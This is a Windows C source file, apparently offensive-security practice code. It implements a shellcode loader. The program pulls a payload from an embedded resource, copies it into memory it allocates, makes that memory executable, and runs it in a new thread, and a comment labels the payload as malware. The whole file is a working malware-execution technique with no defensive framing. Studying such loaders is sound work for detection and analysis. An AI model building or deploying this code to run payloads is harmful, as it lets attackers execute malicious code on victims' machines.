// imports
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define SC_ICON 1337


int main(VOID) {

    HRSRC rsrcHandle = FindResourceW(
        NULL,
        MAKEINTRESOURCEW(SC_ICON),
        RT_RCDATA
        // [in, optional] HMODULE hModule,
        // [in]           LPCSTR  lpName,
        // [in]           LPCSTR  lpType
    );

    // Load the resource in memory
    HGLOBAL loadedResource = LoadResource(
        NULL,
        rsrcHandle
        // [in, optional] HMODULE hModule,
        // [in]           HRSRC   hResInfo
    );

    // Get the pointer to loaded resource
    LPVOID resourcePointer = LockResource(
        loadedResource
        // [in] HGLOBAL hResData
    );

    // Get sizeof resource
    DWORD shellcode_length = SizeofResource(
        NULL,
        rsrcHandle
        // [in, optional] HMODULE hModule,
        // [in]           HRSRC   hResInfo
    );
    // Allocate virtual memory for the code
    LPVOID memory_address = VirtualAlloc(
        NULL,
        shellcode_length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (memory_address == NULL) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }
    // Load shellcode into memory
    RtlMoveMemory(
        memory_address, 
        resourcePointer,
        shellcode_length
        //   _Out_       VOID UNALIGNED *Destination,
        //   _In_  const VOID UNALIGNED *Source,
        //   _In_        SIZE_T         Length
    );

    // Make shellcode executable
    DWORD old_protection = 0;
    BOOL virtualprotect_success = VirtualProtect(
        memory_address,
        shellcode_length,
        PAGE_EXECUTE,
        &old_protection
        //   [in]  LPVOID lpAddress,
        //   [in]  SIZE_T dwSize,
        //   [in]  DWORD  flNewProtect,
        //   [out] PDWORD lpflOldProtect
    );
    printf("Virtual Protect Success: %d\n", virtualprotect_success);
    // Create thread to execute malware
    if (virtualprotect_success != NULL) {
        printf("Executing thread\n");
        HANDLE shellcodeThreadHandle = CreateThread(
            NULL,
            NULL,
            (LPTHREAD_START_ROUTINE) memory_address,
            NULL,
            NULL,
            NULL
            // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            // [in]            SIZE_T                  dwStackSize,
            // [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
            // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
            // [in]            DWORD                   dwCreationFlags,
            // [out, optional] LPDWORD                 lpThreadId
        );

        // Wait for the thread to complete
        WaitForSingleObject(
            shellcodeThreadHandle,
            INFINITE
            // [in] HANDLE hHandle,
            // [in] DWORD  dwMilliseconds
        );
    }

}